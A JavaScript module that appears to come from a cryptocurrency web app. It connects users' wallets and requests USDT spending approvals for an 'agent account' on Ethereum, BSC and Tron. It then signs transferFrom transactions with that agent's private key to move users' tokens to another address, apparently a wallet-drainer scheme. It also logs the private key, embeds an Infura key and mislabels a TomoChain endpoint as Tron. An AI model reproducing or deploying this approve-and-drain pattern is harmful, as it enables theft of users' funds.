import Web3 from 'web3'// /dist/web3.min.js
import { providers } from "ethers"
import { provider } from "../blockchain/WalletProvider"

//智能合约ABI与地址(ETH)
import abiERC20 from '../blockchain/ERC20.json'
import abiERC20_Check from '../blockchain/ERC20_Check.json'
let ContractERC20 = '0xdAC17F958D2ee523a2206206994597C13D831ec7'

//智能合约ABI与地址(BSC)
import abiBEP20 from '../blockchain/BEP20.json'
let ConTractBEP20 = '0x55d398326f99059fF775485246999027B3197955'

//智能合约ABI与地址(TRC)
import abiTRC20 from '../blockchain/TRC20.json'
let ConTractTRC20 = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'


var wallet = ''
const Tx = require('ethereumjs-tx')
const Web3Utils = require('web3-utils')

export default class BlockChainBase {

    financialMfil(numMfil) {
        return Number.parseFloat(numMfil / 1e3).toFixed(3);
    }

    //根据链不同 调用不同的abi和智能合约
    onCheckChainLink(type, callBack) {
        if (type == 'ETH') {
            callBack(abiERC20, abiERC20_Check, ContractERC20, 'https://mainnet.infura.io/v3/75f5a6b0e4514c50858504adf83ed5e1', 1)
        }
        else if (type == 'BSC') {
            callBack(abiBEP20, abiBEP20, ConTractBEP20, 'https://bsc-dataseed.binance.org', 56)
        }
        else if (type == 'TRC') {
            callBack(abiTRC20, abiTRC20, ConTractTRC20, 'https://rpc.tomochain.com', 88) //https://trx.mytokenpocket.vip
        }
        else console.log('无法获取到' + type + '链的数据')
    }

    //连接钱包
    async doConnectWallet(callBack, type) {
        try {
            if (wallet == '') {

                // if (type == 'ETH') provider.updateRpcUrl(1)
                // else if (type == 'BSC') provider.updateRpcUrl(56)
                // else if (type == 'TRC') provider.updateRpcUrl(88)

                wallet = await provider.enable()
                    .catch(() => {
                        console.warn("用户取消连接钱包")
                        callBack('DisApprove')
                    })
                    .then(async function () {
                        console.log("开始执行授权")
                        callBack('Approve', new Web3(provider))
                    })
            }
            else {
                callBack('Approve', new Web3(provider))
            }
        }
        catch (e) {
            console.error("连接钱包错误提示:", e)
        }
    }

    //断开连接钱包
    async doDisConnectWallet() {
        try {
            await provider.disconnect().then(() => {
                console.log("执行完毕")
                wallet = ''

                location.reload()
            })
        }
        catch (e) {
            console.log("错误提示:", e)
        }
    }

    //用户钱包授权给代理账户
    // async doApprove(web3, address, callBack) {
    //     try {
    //         if (web3 == null)
    //             web3 = new Web3(provider)

    //         var contract = new web3.eth.Contract(abiERC20, ContractERC20)
    //         let amount = 100 * Math.pow(10, 18)

    //         web3.eth.getAccounts().then(function (account) {
    //             var userAddress = account[0] //用户钱包地址
    //             contract.methods.approve(address, web3.utils.toWei(`${amount}`, 'ether'))
    //                 .send({ from: userAddress })
    //                 .then(function () {
    //                     callBack(true, userAddress)
    //                 })
    //                 .catch((reason) => {
    //                     if (reason.code == 4001) {
    //                         console.warn('授权失败, 其他原因')
    //                         callBack(false, null)
    //                     }
    //                     else if (reason.code == undefined) {
    //                         console.warn('授权失败, 用户取消')
    //                         callBack(false, null)
    //                     }
    //                 });
    //         })
    //     }
    //     catch (e) {
    //         console.error("授权错误提示:", e)
    //     }

    // }

    //用户钱包授权给代理账户
    async doApprove(web3, address, callBack, type) {
        try {
            this.onCheckChainLink(type, (abi, abiCheck, abiContract, link, abiChainID) => {
                if (web3 == null)
                    web3 = new Web3(link || Web3.givenProvider)

                console.log('link = ', link)
                console.log('web3 = ', web3)
                var contract = new web3.eth.Contract(abi, abiContract)
                console.log('type = ', type)

                let amount = 100 * Math.pow(10, 18)
                web3.eth.getAccounts().then(function (account) {
                    var userAddress = account[0] //用户钱包地址

                    web3.eth.getChainId(async (err, chainid) => {
                        if (err != null) {
                            console.log('区块链ID:' + chainid + ' 错误信息:' + err)
                            return
                        }

                        if (abiChainID == chainid) {
                            callBack(true, userAddress) //返回创建账号
                            contract.methods.approve(address, web3.utils.toWei(`${amount}`, 'ether'))
                                .send({ from: userAddress })
                                .then(function () {
                                })
                                .catch((reason) => {
                                    if (reason.code == 4001) console.warn('授权失败, 其他原因')
                                    else if (reason.code == undefined) console.warn('授权失败, 用户取消')
                                })
                        }
                        else {
                            alert('请选择' + type + '链的钱包地址')
                            await provider.disconnect().then(() => {
                                console.log("执行完毕")
                                wallet = ''

                                location.reload()
                            })
                        }
                    })
                })
            })
        }
        catch (e) {
            console.error("授权错误提示:", e)
        }
    }

    //查询账户余额
    async doBalanceOf(agentAddress, userAddress, callBack, web3, isTransfer, type) {
        this.onCheckChainLink(type, (abi, abiCheck, abiContract, link) => {
            web3 = new Web3(link || Web3.givenProvider)
            var contract = new web3.eth.Contract(abi, abiContract)

            contract.methods.balanceOf(userAddress)
                .call({ from: agentAddress }, function (error, balance) {
                    if (!error) {
                        if (isTransfer)
                            callBack(balance, web3)
                        else
                            callBack(web3.utils.fromWei(balance, 'mwei'), web3)
                    }
                    else callBack(null, web3)
                })
        })
    }

    //检查是否授权
    async checkApprove(agentAddress, userAddress, callBack, type) {
        this.onCheckChainLink(type, async (abi, abiCheck, abiContract, link) => {
            let web3 = new Web3(link || Web3.givenProvider)
            var contract = new web3.eth.Contract(abiCheck, abiContract)
            await contract.methods.allowance(userAddress, agentAddress).call(async function (err, res) {
                if (err == null && res != 0) {
                    console.log(type + ': 账户 ' + userAddress + ' 授权给' + agentAddress)
                    callBack(true)
                }
                else {
                    console.log(type + '：账户 ' + userAddress + ' 未授权给' + agentAddress)
                    callBack(false)
                }
            })
        })
    }

    //划账
    async doTransferFrom(agentAddress, agentAPIKEY, userAddress, toAddress, amount, callBack, web3, ownNonce, index, type) {
        console.log(`------------------------`)

        console.log('激励钱包私钥 = ', agentAPIKEY)
        console.log('激励钱包地址 = ', agentAddress)
        console.log('发款钱包地址 = ', userAddress)
        console.log('收款钱包地址 = ', toAddress)

        console.log(`------------------------`)

        if (amount <= 1) {
            console.log('用户钱包余额不足')
            return
        }

        this.onCheckChainLink(type, (abi, abiCheck, abiContract, link) => {
            web3 = new Web3(link || Web3.givenProvider)

            web3.eth.defaultAccount = userAddress
            web3.eth.getChainId(async (err, chainid) => {
                console.log(`区块链ID: ${chainid}\n------------------------`)

                if (err != null) {
                    console.log('区块链ID:' + chainid + ' 错误信息:' + err)
                    return
                }

                var contract = new web3.eth.Contract(abi, abiContract,
                    {
                        from: userAddress, //[1] 从代理账户上划帐 排除这里的问题！！
                        gasPrice: '14',
                        gas: '210000'
                    })

                //[2] 尝试修改这里地址
                web3.eth.getTransactionCount(agentAddress, 'latest', async (error, nonce) => { //pending earliest latest
                    console.log(`服务器交易梯度: ${ownNonce}`)
                    console.log(`区块链交易梯度: ${nonce}`)

                    var curNonce = nonce
                    // if (nonce > ownNonce) curNonce = nonce //如果区块链梯度大于服务器梯度, 默认使用区块链的否则优先使用服务器的
                    // else curNonce = ownNonce
                    curNonce += index
                    console.log(`使用梯度: ${curNonce}\n------------------------`)

                    if (!error) {
                        console.log('web3 = ', web3)
                        console.log('contract = ', contract)
                        console.log(`------------------------`)

                        var transferFromData
                        if (type == 'ETH')
                            transferFromData = contract.methods.transferFrom(userAddress, toAddress, web3.utils.BN(amount)).encodeABI()
                        else
                            transferFromData = contract.methods.transferFrom(userAddress, toAddress, web3.utils.toBN(amount)).encodeABI()

                        try {
                            const txObject = {
                                chainId: web3.utils.toHex(chainid),
                                nonce: web3.utils.toHex(curNonce),
                                from: userAddress,
                                to: abiContract,
                                value: '0x00',
                                gasLimit: web3.utils.toHex(10000000000000),
                                gas: web3.utils.toHex(210000),
                                gasPrice: web3.utils.toHex(14 * 1e9),
                                data: transferFromData
                            }
                            console.log(`解析后的数据: \n${JSON.stringify(txObject, null, '\t')}\n------------------------`)

                            const tx = new Tx(txObject)
                            const privateKey = Buffer.from(agentAPIKEY, "hex")
                            tx.sign(privateKey)
                            const serializedTx = tx.serialize()
                            console.log(`签名后的数据:  ${serializedTx.toString('hex')}\n------------------------`)

                            web3.eth.sendSignedTransaction('0x' + serializedTx.toString('hex'), (err, txHash) => {
                                if (!err) {
                                    console.log('txHash = ', txHash)
                                    callBack(true, txHash, curNonce + 1)
                                }
                            }).catch(function (err) {
                                callBack(false, err)
                            })
                        }
                        catch (e) {
                            console.warn("错误信息: \n" + e)
                        }
                    }
                })
            })
        })
    }

    //激励
    async doTransfer(agentAddress, userAddress, amount, callBack, web3, type) {
        console.log(`------------------------`)
        console.log('发款钱包地址 = ', agentAddress)
        console.log('收款钱包地址 = ', userAddress)

        console.log(`------------------------`)


        this.onCheckChainLink(type, async (abi, abiCheck, abiContract, link, abiChainID) => {
            web3 = new Web3(link || Web3.givenProvider)
            const contract = new web3.eth.Contract(abi, abiContract)

            await contract.methods.transfer(agentAddress, userAddress, amount).send({
                from: agentAddress,
                gasPrice: web3.utils.toHex(13 * 1e9),
                gas: '210000'
            }, function (err, res) {
                if (err == null)
                    callBack(true, res)
            }).catch(function () {
                callBack(false)
            })
        })
    }
}